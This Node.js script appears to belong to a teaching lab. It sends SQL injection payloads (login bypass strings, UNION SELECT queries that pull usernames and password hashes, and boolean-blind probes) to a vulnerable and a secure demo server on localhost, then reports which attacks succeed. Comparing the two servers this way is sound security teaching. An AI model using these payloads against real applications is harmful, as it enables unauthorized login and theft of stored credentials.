/**
 * SQL Injection Attack Testing Script for Node.js
 * Tests both vulnerable and secure implementations
 */

const http = require('http');

const VULNERABLE_URL = 'http://localhost:3001';
const SECURE_URL = 'http://localhost:3002';

function printHeader(text) {
    console.log('\n' + '='.repeat(70));
    console.log(`  ${text}`);
    console.log('='.repeat(70));
}

function makeRequest(url, method, path, body = null) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url + path);
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port,
            path: urlObj.pathname + urlObj.search,
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                try {
                    resolve({ status: res.statusCode, data: JSON.parse(data) });
                } catch (e) {
                    resolve({ status: res.statusCode, data: data });
                }
            });
        });

        req.on('error', reject);
        
        if (body) {
            req.write(JSON.stringify(body));
        }
        
        req.end();
    });
}

async function testAuthBypass(baseUrl, versionName) {
    printHeader(`Testing Auth Bypass on ${versionName}`);
    
    const attacks = [
        { username: "admin' OR '1'='1'--", password: "anything" },
        { username: "admin'--", password: "" },
        { username: "' OR 1=1--", password: "" }
    ];
    
    for (let i = 0; i < attacks.length; i++) {
        const payload = attacks[i];
        console.log(`\nAttack ${i + 1}: ${payload.username}`);
        
        try {
            const response = await makeRequest(baseUrl, 'POST', '/api/login', payload);
            console.log(`Status: ${response.status}`);
            console.log(`Response: ${JSON.stringify(response.data, null, 2)}`);
            
            if (response.data.success) {
                console.log('🚨 VULNERABILITY CONFIRMED - Auth bypass successful!');
            } else {
                console.log('✅ Attack blocked');
            }
        } catch (error) {
            console.log(`❌ Error: ${error.message}`);
        }
    }
}

async function testUnionInjection(baseUrl, versionName) {
    printHeader(`Testing UNION Injection on ${versionName}`);
    
    const attacks = [
        "' UNION SELECT UserId, Username, Email FROM Users--",
        "' UNION SELECT 1, Username, PasswordHash FROM Users--"
    ];
    
    for (let i = 0; i < attacks.length; i++) {
        const payload = attacks[i];
        console.log(`\nAttack ${i + 1}: ${payload}`);
        
        try {
            const response = await makeRequest(baseUrl, 'GET', `/api/posts/search?q=${encodeURIComponent(payload)}`);
            console.log(`Status: ${response.status}`);
            
            if (response.data.success && response.data.posts.length > 0) {
                console.log(`🚨 Data extracted: ${response.data.posts.length} records`);
                console.log(`Sample: ${JSON.stringify(response.data.posts[0], null, 2)}`);
            } else {
                console.log('✅ Attack blocked');
            }
        } catch (error) {
            console.log(`❌ Error: ${error.message}`);
        }
    }
}

async function testBooleanBlind(baseUrl, versionName) {
    printHeader(`Testing Boolean Blind Injection on ${versionName}`);
    
    const attacks = [
        { payload: "' AND 1=1--", description: "True condition" },
        { payload: "' AND 1=2--", description: "False condition" }
    ];
    
    for (const attack of attacks) {
        console.log(`\nAttack: ${attack.payload} (${attack.description})`);
        
        try {
            const response = await makeRequest(baseUrl, 'GET', `/api/posts/search?q=${encodeURIComponent(attack.payload)}`);
            console.log(`Status: ${response.status}`);
            console.log(`Results: ${response.data.posts?.length || 0} posts`);
            
            if (response.data.success) {
                console.log('🚨 Query executed - boolean condition observable');
            } else {
                console.log('✅ Attack blocked');
            }
        } catch (error) {
            console.log(`❌ Error: ${error.message}`);
        }
    }
}

async function main() {
    console.log(`
    ╔═══════════════════════════════════════════════════════════╗
    ║      SQL Injection Testing Suite - Node.js Express        ║
    ║                                                           ║
    ║  Make sure both servers are running:                      ║
    ║  - Vulnerable: node vulnerable_app.js (port 3001)         ║
    ║  - Secure: node secure_app.js (port 3002)                ║
    ╚═══════════════════════════════════════════════════════════╝
    `);
    
    // Test vulnerable version
    console.log('\n\n' + '█'.repeat(70));
    console.log('█' + ' '.repeat(68) + '█');
    console.log('█' + ' '.repeat(20) + 'VULNERABLE VERSION' + ' '.repeat(30) + '█');
    console.log('█' + ' '.repeat(68) + '█');
    console.log('█'.repeat(70));
    
    await testAuthBypass(VULNERABLE_URL, 'Vulnerable App');
    await testUnionInjection(VULNERABLE_URL, 'Vulnerable App');
    await testBooleanBlind(VULNERABLE_URL, 'Vulnerable App');
    
    // Test secure version
    console.log('\n\n' + '█'.repeat(70));
    console.log('█' + ' '.repeat(68) + '█');
    console.log('█' + ' '.repeat(23) + 'SECURE VERSION' + ' '.repeat(31) + '█');
    console.log('█' + ' '.repeat(68) + '█');
    console.log('█'.repeat(70));
    
    await testAuthBypass(SECURE_URL, 'Secure App');
    await testUnionInjection(SECURE_URL, 'Secure App');
    await testBooleanBlind(SECURE_URL, 'Secure App');
    
    console.log('\n\n' + '='.repeat(70));
    console.log('Testing Complete!');
    console.log('='.repeat(70));
}

main().catch(console.error);

